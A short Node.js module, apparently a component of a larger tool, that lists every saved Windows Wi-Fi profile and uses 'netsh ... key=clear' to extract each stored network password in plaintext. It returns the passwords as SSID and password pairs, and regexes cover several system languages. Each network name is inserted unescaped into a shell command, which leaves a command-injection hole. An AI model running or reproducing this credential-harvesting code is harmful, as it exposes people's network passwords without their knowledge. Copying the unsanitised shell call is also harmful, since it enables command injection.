const execAsync = require("../utils/execAsync");
const logger = require("../utils/logger");

const PROFILE_RE = /^\s+\S.*:\s*(.+)$/m;
const KEY_CONTENT_RE = /(?:Key Content|Contenu de la clé|Schlüsselinhalt|Contenido de la clave|Contenuto chiave|Conteúdo da chave|关键内容)\s*:\s*(.+)$/im;

async function getWifiProfiles() {
    try {
        const output = await execAsync("netsh wlan show profiles", { timeout: 10000 });
        const profiles = [];
        for (const line of output.split("\n")) {
            const match = line.match(PROFILE_RE);
            if (match) {
                const name = match[1].trim();
                if (name) profiles.push(name);
            }
        }

        const results = await Promise.allSettled(
            profiles.map(async ssid => {
                try {
                    const detail = await execAsync(
                        `netsh wlan show profile name="${ssid}" key=clear`,
                        { timeout: 10000 }
                    );
                    const keyMatch = detail.match(KEY_CONTENT_RE);
                    return { ssid, password: keyMatch ? keyMatch[1].trim() : "N/A" };
                } catch {
                    return { ssid, password: "N/A" };
                }
            })
        );

        return results.map(r => r.status === "fulfilled" ? r.value : null).filter(Boolean);
    } catch (err) {
        logger.warn(`WiFi profiles query failed: ${err.message}`);
        return [];
    }
}

module.exports = getWifiProfiles;
